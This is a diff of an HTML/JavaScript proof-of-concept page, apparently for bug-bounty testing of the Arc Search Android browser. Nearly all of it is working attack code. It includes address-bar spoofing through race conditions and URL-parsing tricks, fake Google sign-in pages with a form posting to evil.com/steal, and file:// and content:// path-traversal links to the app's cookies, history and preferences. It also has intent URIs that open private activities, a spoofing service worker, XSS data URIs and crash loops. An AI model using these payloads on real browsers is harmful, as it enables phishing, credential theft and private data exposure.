@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Arc Search Android Bug Bounty POC — All CVEs</title>
+    <title>Arc Search Android — Advanced Bug Bounty POC</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -47,7 +47,6 @@
         .badge-critical { background: #ff0000; color: #fff; }
         .badge-high { background: #ff6600; color: #fff; }
         .badge-medium { background: #ffaa00; color: #000; }
-        .badge-low { background: #4488ff; color: #fff; }
         .link-group {
             display: flex;
             flex-wrap: wrap;
@@ -99,72 +98,153 @@
             border-radius: 4px;
             border-left: 2px solid #ffaa00;
         }
-        iframe {
-            width: 100%;
-            height: 120px;
-            border: 1px solid #333;
-            margin-top: 6px;
-        }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h1>🧨 Arc Search Android — All POCs in One</h1>
-    <p>CVE-2026-2378 Bypass · CVE-2026-12348 Bypass · Hybrid Attack</p>
+    <h1>🧨 Advanced Bug Bounty POC</h1>
+    <p>Android-specific · Race Conditions · file:// · Service Worker · Intent</p>
 </div>
 
 <!-- ============================================================ -->
-<!-- SECTION 1: CVE-2026-2378 Bypass (URL Parsing)                -->
+<!-- SECTION 1: Race Condition (Advanced Timing)                   -->
 <!-- ============================================================ -->
 <div class="section">
-    <h2>🎯 1. CVE-2026-2378 Bypass <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">Address bar spoof via URL parsing tricks</p>
+    <h2>🏎️ 1. Advanced Race Conditions <span class="badge badge-critical">CRITICAL</span></h2>
+    <p style="font-size:11px;color:#888;">window.open timing attacks — multiple variants</p>
     <div class="link-group">
-        <a href="https://www.google.com@evil.com" class="danger">@ Symbol</a>
-        <a href="https://www.google%2Ecom@evil.com" class="danger">%2E Encoding</a>
-        <a href="https://www.google.com%09.evil.com" class="danger">Tab Injection</a>
-        <a href="https://www.google.com%0A.evil.com" class="danger">Newline Injection</a>
-        <a href="https://арс.com" class="warning">Cyrillic 'а'</a>
-        <a href="https://evil.com@www.google.com" class="danger">Reverse @</a>
-        <a href="https://www.google.com%00.evil.com" class="danger">Null Byte</a>
-        <a href="https://www.google.com%2F@evil.com" class="danger">%2F Encoding</a>
-        <a href="https://www.google.com%5C@evil.com" class="danger">%5C Backslash</a>
+        <button onclick="raceTiming1()">50ms Race</button>
+        <button onclick="raceTiming2()">100ms Race</button>
+        <button onclick="raceTiming3()">500ms Race</button>
+        <button onclick="raceTiming4()">1000ms Race</button>
+        <button onclick="raceIframe()">Iframe Race</button>
+        <button onclick="raceBlob()">Blob URL Race</button>
     </div>
-    <div class="note">💡 Address bar me <b>google.com</b> dikhe par content <b>evil.com</b> ho → BOUNTY!</div>
+    <div class="note">💡 Different timings — kisi na kisi timing pe address bar update miss ho sakta hai</div>
 </div>
 
 <!-- ============================================================ -->
-<!-- SECTION 2: CVE-2026-12348 Bypass (Race Condition)            -->
+<!-- SECTION 2: file:// Access (Android)                          -->
 <!-- ============================================================ -->
 <div class="section">
-    <h2>🏎️ 2. CVE-2026-12348 Bypass <span class="badge badge-critical">CRITICAL</span></h2>
-    <p style="font-size:11px;color:#888;">Race condition via window.open</p>
+    <h2>📂 2. file:// Protocol Access <span class="badge badge-critical">CRITICAL</span></h2>
+    <p style="font-size:11px;color:#888;">Local file access — private app data, system files</p>
     <div class="link-group">
-        <button onclick="raceV1()">Race Condition V1</button>
-        <button onclick="raceV2()">Race Condition V2</button>
-        <button onclick="raceV3()">Race Condition V3 (iframe)</button>
-        <button onclick="raceV4()">Race Condition V4 (history)</button>
+        <a href="file:///data/data/com.thebrowser.arc/shared_prefs/" class="danger">App Shared Prefs</a>
+        <a href="file:///data/data/com.thebrowser.arc/databases/" class="danger">App Databases</a>
+        <a href="file:///data/data/com.thebrowser.arc/app_arc/cookies" class="danger">Browser Cookies</a>
+        <a href="file:///data/data/com.thebrowser.arc/app_arc/History" class="danger">Browser History</a>
+        <a href="file:///sdcard/Android/data/com.thebrowser.arc/" class="warning">External Data</a>
+        <a href="file:///etc/hosts" class="danger">System Hosts</a>
+        <a href="file:///proc/self/cmdline" class="danger">Process Info</a>
+        <a href="file:///system/build.prop" class="danger">Build Properties</a>
+        <button onclick="fileFetch()">Fetch via JS</button>
     </div>
-    <div class="note">💡 Popup me <b>google.com</b> dikhe par content <b>malicious</b> ho → CRITICAL!</div>
+    <div class="note">💡 Agar koi file open ho ya content visible ho → CRITICAL BUG!</div>
 </div>
 
 <!-- ============================================================ -->
-<!-- SECTION 3: Hybrid Attack (Combined)                          -->
+<!-- SECTION 3: content:// Provider                                -->
 <!-- ============================================================ -->
 <div class="section">
-    <h2>🔥 3. Hybrid Attack <span class="badge badge-critical">CRITICAL</span></h2>
-    <p style="font-size:11px;color:#888;">CVE-2026-2378 + CVE-2026-12348 combined</p>
+    <h2>🗄️ 3. content:// Provider Exploits <span class="badge badge-high">HIGH</span></h2>
+    <p style="font-size:11px;color:#888;">Content URIs, path traversal, file disclosure</p>
     <div class="link-group">
-        <button onclick="hybridAttack()">Hybrid Attack</button>
-        <button onclick="hybridAttackV2()">Hybrid Attack V2</button>
-        <button onclick="hybridAttackV3()">Hybrid Attack V3 (PWA)</button>
+        <a href="content://com.thebrowser.arc.fileprovider/root/data/data/com.thebrowser.arc/shared_prefs/" class="danger">FileProvider Root</a>
+        <a href="content://com.thebrowser.arc.fileprovider/../../data/data/com.thebrowser.arc/shared_prefs/" class="danger">Path Traversal</a>
+        <a href="content://com.thebrowser.arc.fileprovider/../../../../etc/hosts" class="danger">Traversal to /etc</a>
+        <a href="content://com.thebrowser.arc/shared_prefs/" class="warning">Shared Prefs</a>
+        <a href="content://com.thebrowser.arc/databases/" class="warning">Databases</a>
+        <a href="content://com.android.chrome.FileProvider/" class="warning">Chrome FileProvider</a>
+        <a href="content://media/external/images/media/" class="warning">Media Images</a>
     </div>
-    <div class="note">💡 Strongest bypass — multiple techniques combined</div>
+    <div class="note">💡 Agar directory listing ya file content dikhe → DATA LEAK!</div>
 </div>
 
 <!-- ============================================================ -->
-<!-- SECTION 4: Logs                                               -->
+<!-- SECTION 4: Intent URI Exploits                                -->
+<!-- ============================================================ -->
+<div class="section">
+    <h2>📱 4. Intent URI Exploits <span class="badge badge-high">HIGH</span></h2>
+    <p style="font-size:11px;color:#888;">Android intents — private activities, file access</p>
+    <div class="link-group">
+        <a href="intent:#Intent;component=com.thebrowser.arc/.SettingsActivity;end" class="danger">Settings Activity</a>
+        <a href="intent:#Intent;component=com.thebrowser.arc/.DebugActivity;end" class="danger">Debug Activity</a>
+        <a href="intent:#Intent;component=com.thebrowser.arc/.WebAppActivity;S.browser_fallback_url=https://evil.com;end" class="danger">WebApp + Fallback</a>
+        <a href="intent:#Intent;S.url=file:///data/data/com.thebrowser.arc/shared_prefs/config.xml;end" class="danger">File via Intent</a>
+        <a href="intent:#Intent;SEL;component=com.thebrowser.arc/.SettingsActivity;SEL;component=com.thebrowser.arc/.DebugActivity;end" class="warning">Multiple Selectors</a>
+        <a href="intent://#Intent;action=android.settings.SETTINGS;end" class="warning">System Settings</a>
+        <a href="intent://#Intent;action=android.intent.action.VIEW;data=content://com.thebrowser.arc/shared_prefs;end" class="warning">Content Intent</a>
+    </div>
+    <div class="note">💡 Agar private activity open ho → HIGH SEVERITY!</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SECTION 5: Service Worker Spoofing                           -->
+<!-- ============================================================ -->
+<div class="section">
+    <h2>⚙️ 5. Service Worker Spoofing <span class="badge badge-high">HIGH</span></h2>
+    <p style="font-size:11px;color:#888;">Persistent spoofing via service worker interception</p>
+    <div class="link-group">
+        <button onclick="registerSWSpoof()">Register Spoofing SW</button>
+        <button onclick="unregisterSW()">Unregister SW</button>
+        <button onclick="testSWIntercept()">Test SW Intercept</button>
+    </div>
+    <div class="note">💡 Agar SW intercept kare → PERSISTENT SPOOFING possible!</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SECTION 6: Data URI + Blob Spoofing                         -->
+<!-- ============================================================ -->
+<div class="section">
+    <h2>🧪 6. Data URI / Blob Spoofing <span class="badge badge-medium">MEDIUM</span></h2>
+    <p style="font-size:11px;color:#888;">Data URIs, blob URLs, javascript execution</p>
+    <div class="link-group">
+        <a href="data:text/html;base64,PGh0bWw+PGJvZHk+PGgxPkZha2UgR29vZ2xlPC9oMT48c2NyaXB0PmFsZXJ0KCdY U1MnKTwvc2NyaXB0PjwvYm9keT48L2h0bWw+" class="danger">Base64 Data URI</a>
+        <a href="data:text/html;charset=utf-8,<html><body><h1>Fake</h1><script>alert('XSS')</script></body></html>" class="danger">JS in Data URI</a>
+        <a href="javascript:alert('XSS via javascript:')" class="danger">javascript: URI</a>
+        <button onclick="blobSpoof()">Blob URL Spoof</button>
+        <button onclick="blobIframe()">Blob Iframe</button>
+    </div>
+    <div class="note">💡 Agar alert() execute ho → XSS!</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SECTION 7: URL Parsing Bypass (Naya Variant)                -->
+<!-- ============================================================ -->
+<div class="section">
+    <h2>🎭 7. URL Parsing Bypass <span class="badge badge-high">HIGH</span></h2>
+    <p style="font-size:11px;color:#888;">New URL parsing tricks — beyond @ and %</p>
+    <div class="link-group">
+        <a href="https://www.google.com%2e%2e@evil.com" class="danger">%2e%2e Encoding</a>
+        <a href="https://www.google.com%ef%bc%8f@evil.com" class="danger">Fullwidth Slash</a>
+        <a href="https://www.google.com%ef%bc%a0@evil.com" class="danger">Fullwidth @</a>
+        <a href="https://www.google.com%3f@evil.com" class="danger">%3f (?) Encoding</a>
+        <a href="https://www.google.com%23@evil.com" class="danger">%23 (#) Encoding</a>
+        <a href="https://www.google.com%3a@evil.com" class="danger">%3a (:) Encoding</a>
+        <a href="https://www.google.com%2b@evil.com" class="danger">%2b (+) Encoding</a>
+    </div>
+    <div class="note">💡 Naye encoding tricks — browser parse differently kar sakta hai</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SECTION 8: Crash / DoS                                        -->
+<!-- ============================================================ -->
+<div class="section">
+    <h2>💥 8. Crash / DoS Vectors <span class="badge badge-medium">MEDIUM</span></h2>
+    <p style="font-size:11px;color:#888;">Long URLs, malformed input, resource exhaustion</p>
+    <div class="link-group">
+        <a href="https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.google.com" class="warning">Long Subdomain</a>
+        <a href="https://google.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" class="warning">Long Path</a>
+        <button onclick="crashTest()">Crash via Large Data</button>
+        <button onclick="memoryLeak()">Memory Leak Test</button>
+    </div>
+    <div class="note">💡 Agar app crash ho → DoS bug!</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SECTION 9: Logs                                               -->
 <!-- ============================================================ -->
 <div class="section" style="border-color:#00ff41;">
     <h2>📋 Test Log</h2>
@@ -197,7 +277,7 @@ function exportLog() {
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = 'arc_bug_bounty_log.txt';
+    a.download = 'arc_advanced_bug_log.txt';
     a.click();
     log('📤 Log exported', 'success');
 }
@@ -206,41 +286,68 @@ function exportLog() {
 document.querySelectorAll('a').forEach(a => {
     a.addEventListener('click', function(e) {
         const text = this.textContent.trim() || this.href;
-        log(`🔗 Clicked: ${text} — watch address bar!`, 'warning');
+        log(`🔗 Clicked: ${text}`, 'warning');
         setTimeout(() => {
-            log(`📌 Current URL: ${this.href}`, 'info');
+            log(`📌 URL: ${this.href}`, 'info');
         }, 500);
     });
 });
 
 // ================================================================
-// 2. RACE CONDITION FUNCTIONS
+// 1. RACE CONDITION FUNCTIONS
 // ================================================================
 
-function raceV1() {
-    log('🏎️ Race V1 triggered', 'danger');
+function raceTiming1() {
+    log('🏎️ 50ms Race triggered', 'danger');
     let win = window.open('about:blank', '_blank');
     setTimeout(() => {
         win.location = 'https://www.google.com';
         setTimeout(() => {
-            win.document.write(`
-                <html><body>
-                    <h1 style="color:red;">🚨 ATTACKER CONTENT</h1>
-                    <p>Address bar shows google.com but this is evil!</p>
-                    <form action="https://evil.com/steal">
-                        <input type="password" placeholder="Enter password">
-                        <button>Submit</button>
-                    </form>
-                </body></html>
-            `);
-            log('⚠️ Malicious content injected — check address bar!', 'danger');
+            win.document.write('<html><body><h1 style="color:red;">🚨 ATTACKER</h1><p>50ms race</p></body></html>');
+            log('⚠️ 50ms — check address bar!', 'danger');
         }, 50);
     }, 50);
 }
 
-function raceV2() {
-    log('🏎️ Race V2 triggered', 'danger');
-    let win = window.open('https://evil.com', '_blank');
+function raceTiming2() {
+    log('🏎️ 100ms Race triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
+    setTimeout(() => {
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            win.document.write('<html><body><h1 style="color:red;">🚨 ATTACKER</h1><p>100ms race</p></body></html>');
+            log('⚠️ 100ms — check address bar!', 'danger');
+        }, 100);
+    }, 100);
+}
+
+function raceTiming3() {
+    log('🏎️ 500ms Race triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
+    setTimeout(() => {
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            win.document.write('<html><body><h1 style="color:red;">🚨 ATTACKER</h1><p>500ms race</p></body></html>');
+            log('⚠️ 500ms — check address bar!', 'danger');
+        }, 500);
+    }, 500);
+}
+
+function raceTiming4() {
+    log('🏎️ 1000ms Race triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
+    setTimeout(() => {
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            win.document.write('<html><body><h1 style="color:red;">🚨 ATTACKER</h1><p>1000ms race</p></body></html>');
+            log('⚠️ 1000ms — check address bar!', 'danger');
+        }, 1000);
+    }, 1000);
+}
+
+function raceIframe() {
+    log('🏎️ Iframe Race triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
     setTimeout(() => {
         win.location = 'https://www.google.com';
         setTimeout(() => {
@@ -250,125 +357,149 @@ function raceV2() {
             win.document.body.innerHTML = '';
             win.document.body.appendChild(iframe);
             log('⚠️ Iframe injected — check address bar!', 'danger');
-        }, 100);
-    }, 100);
+        }, 200);
+    }, 200);
 }
 
-function raceV3() {
-    log('🏎️ Race V3 (iframe) triggered', 'danger');
+function raceBlob() {
+    log('🏎️ Blob Race triggered', 'danger');
     let win = window.open('about:blank', '_blank');
+    let blob = new Blob(['<html><body><h1 style="color:red;">🚨 BLOB ATTACK</h1></body></html>'], {type: 'text/html'});
+    let url = URL.createObjectURL(blob);
     setTimeout(() => {
         win.location = 'https://www.google.com';
         setTimeout(() => {
-            win.document.write(`
-                <html><body>
-                    <h1>Google</h1>
-                    <iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;"></iframe>
-                </body></html>
-            `);
-            log('⚠️ Iframe overlay injected', 'danger');
+            win.location = url;
+            log('⚠️ Blob URL loaded — check address bar!', 'danger');
         }, 100);
     }, 100);
 }
 
-function raceV4() {
-    log('🏎️ Race V4 (history) triggered', 'danger');
-    let win = window.open('https://www.google.com', '_blank');
-    setTimeout(() => {
-        win.history.pushState({}, 'Google', 'https://www.google.com/fake');
-        setTimeout(() => {
-            win.document.write(`
-                <html><body>
-                    <h1 style="color:red;">🚨 PHISHING PAGE</h1>
-                    <p>Address bar locked to google.com</p>
-                </body></html>
-            `);
-            log('⚠️ history.pushState used — address bar locked?', 'danger');
-        }, 100);
-    }, 500);
+// ================================================================
+// 2. FILE:// FUNCTIONS
+// ================================================================
+
+function fileFetch() {
+    log('📂 file:// fetch attempt', 'danger');
+    fetch('file:///data/data/com.thebrowser.arc/shared_prefs/config.xml')
+        .then(res => res.text())
+        .then(data => {
+            log('✅ FILE ACCESS SUCCESSFUL! Data: ' + data.substring(0, 100), 'danger');
+            alert('File content: ' + data);
+        })
+        .catch(err => {
+            log('❌ file:// fetch blocked: ' + err.message, 'info');
+        });
 }
 
 // ================================================================
-// 3. HYBRID ATTACK FUNCTIONS
+// 3. SERVICE WORKER FUNCTIONS
 // ================================================================
 
-function hybridAttack() {
-    log('🔥 Hybrid Attack triggered', 'danger');
-    let win = window.open('https://www.google.com', '_blank');
-    setTimeout(() => {
-        win.history.pushState({}, 'Google', 'https://www.google.com/fake');
-        setTimeout(() => {
-            let iframe = win.document.createElement('iframe');
-            iframe.src = 'https://evil.com';
-            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
-            win.document.body.innerHTML = '';
-            win.document.body.appendChild(iframe);
-            win.history.pushState({}, 'Google', 'https://www.google.com/locked');
-            log('⚠️ Hybrid attack executed — address bar locked?', 'danger');
-        }, 200);
-    }, 500);
+async function registerSWSpoof() {
+    log('⚙️ Registering spoofing SW', 'danger');
+    try {
+        const swCode = `
+            self.addEventListener('fetch', function(e) {
+                if (e.request.url.includes('google.com')) {
+                    e.respondWith(new Response(
+                        '<html><body><h1 style="color:red;">🚨 SPOOFED BY SW</h1><p>This is not Google!</p></body></html>',
+                        {status: 200, headers: {'Content-Type': 'text/html'}}
+                    ));
+                } else {
+                    e.respondWith(fetch(e.request));
+                }
+            });
+        `;
+        const blob = new Blob([swCode], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        const reg = await navigator.serviceWorker.register(swUrl, {scope: '/'});
+        log('✅ SW registered — now try opening google.com', 'success');
+        alert('SW Registered! Now open https://google.com — it should show spoofed content!');
+    } catch(e) {
+        log('❌ SW registration failed: ' + e.message, 'danger');
+        alert('SW failed: ' + e.message);
+    }
 }
 
-function hybridAttackV2() {
-    log('🔥 Hybrid Attack V2 triggered', 'danger');
-    let win = window.open('https://www.google.com@evil.com', '_blank');
-    setTimeout(() => {
-        win.history.pushState({}, 'Google', 'https://www.google.com/secure');
-        setTimeout(() => {
-            win.document.write(`
-                <html><body style="background:#fff;">
-                    <h1 style="color:red;">🚨 FAKE GOOGLE</h1>
-                    <p>This is a phishing page!</p>
-                    <input type="password" placeholder="Enter your Google password">
-                    <button onclick="alert('Password stolen!')">Submit</button>
-                </body></html>
-            `);
-            win.history.pushState({}, 'Google', 'https://www.google.com');
-            log('⚠️ Hybrid V2 — fake Google page injected', 'danger');
-        }, 150);
-    }, 150);
+async function unregisterSW() {
+    const regs = await navigator.serviceWorker.getRegistrations();
+    regs.forEach(r => r.unregister());
+    log('🔄 SW unregistered', 'info');
 }
 
-function hybridAttackV3() {
-    log('🔥 Hybrid Attack V3 (PWA style) triggered', 'danger');
-    let win = window.open('https://www.google.com', '_blank');
-    setTimeout(() => {
-        // Try to make it look like a PWA
-        win.document.write(`
-            <html><head>
-                <meta name="apple-mobile-web-app-capable" content="yes">
-                <meta name="mobile-web-app-capable" content="yes">
-                <style>
-                    * { margin:0; padding:0; }
-                    body { font-family: Arial; }
-                    .header { background:#4285f4; color:#fff; padding:15px; }
-                    .content { padding:20px; }
-                    input { width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; }
-                    button { width:100%; padding:12px; background:#4285f4; color:#fff; border:none; }
-                </style>
-            </head><body>
-                <div class="header"><h1>Google</h1></div>
-                <div class="content">
-                    <h2>Sign in</h2>
-                    <input type="email" placeholder="Email or phone">
-                    <input type="password" placeholder="Password">
-                    <button onclick="alert('Credentials stolen!')">Next</button>
-                    <p style="color:#888;font-size:12px;margin-top:20px;">🔒 Secure connection</p>
-                </div>
-            </body></html>
-        `);
-        // Lock address bar
-        win.history.pushState({}, 'Google Sign In', 'https://www.google.com/signin');
-        log('⚠️ PWA-style phishing page — address bar shows google.com', 'danger');
-    }, 300);
+async function testSWIntercept() {
+    log('⚙️ Testing SW intercept', 'warning');
+    try {
+        const res = await fetch('https://google.com');
+        const text = await res.text();
+        if (text.includes('SPOOFED')) {
+            log('✅ SW INTERCEPT WORKING! Spoofed content detected!', 'danger');
+        } else {
+            log('ℹ️ No intercept detected', 'info');
+        }
+    } catch(e) {
+        log('❌ Test failed: ' + e.message, 'danger');
+    }
+}
+
+// ================================================================
+// 4. BLOB FUNCTIONS
+// ================================================================
+
+function blobSpoof() {
+    log('🧪 Blob URL spoof', 'danger');
+    let html = '<html><body><h1 style="color:red;">🚨 BLOB SPOOF</h1><p>Fake Google page</p><input type="password" placeholder="Password"><button>Submit</button></body></html>';
+    let blob = new Blob([html], {type: 'text/html'});
+    let url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+    log('⚠️ Blob URL opened — check address bar!', 'danger');
+}
+
+function blobIframe() {
+    log('🧪 Blob iframe injected', 'danger');
+    let html = '<html><body><h1 style="color:red;">🚨 BLOB IFRAME</h1></body></html>';
+    let blob = new Blob([html], {type: 'text/html'});
+    let url = URL.createObjectURL(blob);
+    let iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.style.cssText = 'width:100%;height:150px;border:1px solid #333;margin-top:8px;';
+    document.body.appendChild(iframe);
+    log('⚠️ Blob iframe injected', 'danger');
+}
+
+// ================================================================
+// 5. CRASH FUNCTIONS
+// ================================================================
+
+function crashTest() {
+    log('💥 Crash test: Creating large data', 'danger');
+    let large = 'A'.repeat(100000000);
+    try {
+        let blob = new Blob([large]);
+        let url = URL.createObjectURL(blob);
+        window.open(url);
+        log('⚠️ Large blob opened — watch for crash', 'warning');
+    } catch(e) {
+        log('⚠️ Memory error: ' + e.message, 'warning');
+    }
+}
+
+function memoryLeak() {
+    log('💥 Memory leak test', 'danger');
+    let arr = [];
+    for (let i = 0; i < 100000; i++) {
+        arr.push(new Array(1000).fill('x'));
+    }
+    log('⚠️ Large array created — watch for memory issues', 'warning');
 }
 
 // ================================================================
 // INIT
 // ================================================================
-log('🚀 All POCs Loaded Successfully', 'success');
-log('📌 CVE-2026-2378 Bypass (9 links) + CVE-2026-12348 Bypass (4 buttons) + Hybrid (3 buttons)', 'info');
-log('💡 Click each and watch address bar carefully!', 'warning');
+log('🚀 Advanced Bug Bounty POC Loaded', 'success');
+log('📌 8 sections — Race Conditions • file:// • content:// • Intent • SW • Data URI • URL Parsing • Crash', 'info');
+log('💡 Click each — watch address bar, app behavior, and logs', 'warning');
 </script>
 </body>
 </html>
